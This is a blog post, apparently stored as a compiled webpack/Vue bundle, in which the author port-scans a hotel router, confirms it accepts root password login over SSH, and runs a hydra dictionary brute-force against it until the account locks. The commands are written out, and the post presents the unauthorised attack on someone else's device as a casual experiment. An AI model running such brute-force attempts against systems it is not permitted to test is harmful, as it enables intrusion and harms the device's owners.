(window.webpackJsonp=window.webpackJsonp||[]).push([[15],{450:function(s,t,a){"use strict";a.r(t);var e=a(43),r=Object(e.a)({},(function(){var s=this,t=s.$createElement,a=s._self._c||t;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("p",[s._v("I was living in a hotel in the qurantine time, which has a very bad network.\nWhile I was doing some network configuration checking, I accidentally found the ssh port of the router is open.")]),s._v(" "),a("h2",{attrs:{id:"scan-open-ports"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#scan-open-ports"}},[s._v("#")]),s._v(" Scan open ports")]),s._v(" "),a("p",[s._v("I was scanning the router for an open HTTP port where I found its ssh port openning.")]),s._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("    nmap "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$TARGET_IP")]),s._v("\n")])])]),a("h2",{attrs:{id:"check-ssh-authentication"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#check-ssh-authentication"}},[s._v("#")]),s._v(" Check ssh authentication")]),s._v(" "),a("p",[s._v("Further check if it accepts "),a("code",[s._v("root")]),s._v(" remote connect and password authentications.")]),s._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ssh")]),s._v(" -v -n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("\n    -o "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("Batchmode")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("yes"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("\n    -o "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("StrictHostKeyChecking")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("no"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("\n    -o "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("UserKnownHostsFile")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("/dev/null"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("\n    root@"),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$TARGET_IP")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[a("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[s._v("2")]),s._v(">")]),a("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[s._v("&1")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("grep")]),s._v(" password\n")])])]),a("p",[s._v("Turns out it does!")]),s._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("debug1: Authentications that can continue: password\nPermission denied "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("password"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(".\n")])])]),a("h2",{attrs:{id:"try-brute-force-the-password"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#try-brute-force-the-password"}},[s._v("#")]),s._v(" Try brute force the password")]),s._v(" "),a("p",[s._v("Use a "),a("a",{attrs:{href:"https://github.com/danielmiessler/SecLists",target:"_blank",rel:"noopener noreferrer"}},[s._v("dictionary"),a("OutboundLink")],1)]),s._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("    hydra -l root -P top-20-common-SSH-passwords.txt "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$TARGET_IP")]),s._v(" -t "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("4")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ssh")]),s._v("\n")])])]),a("h2",{attrs:{id:"user-locked"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#user-locked"}},[s._v("#")]),s._v(" User locked")]),s._v(" "),a("p",[s._v("Afte 10 tries, the "),a("code",[s._v("root")]),s._v(" was locked.\nLooks like it is a Cisco router with "),a("a",{attrs:{href:"https://www.cisco.com/en/US/docs/ios-xml/ios/sec_usr_aaa/configuration/15-2mt/sec-login-pw-retry.html#GUID-CA5A3F7D-E324-490E-B551-802924411091",target:"_blank",rel:"noopener noreferrer"}},[s._v("Login Password Retry Lockout"),a("OutboundLink")],1),s._v(".\nHad to adimit it is secure to me ðŸ˜Œ.")]),s._v(" "),a("h2",{attrs:{id:"reference"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#reference"}},[s._v("#")]),s._v(" Reference")]),s._v(" "),a("ul",[a("li",[a("a",{attrs:{href:"https://serverfault.com/questions/938149/how-to-test-if-ssh-server-allows-passwords",target:"_blank",rel:"noopener noreferrer"}},[s._v("https://serverfault.com/questions/938149/how-to-test-if-ssh-server-allows-passwords"),a("OutboundLink")],1)])])])}),[],!1,null,null,null);t.default=r.exports}}]);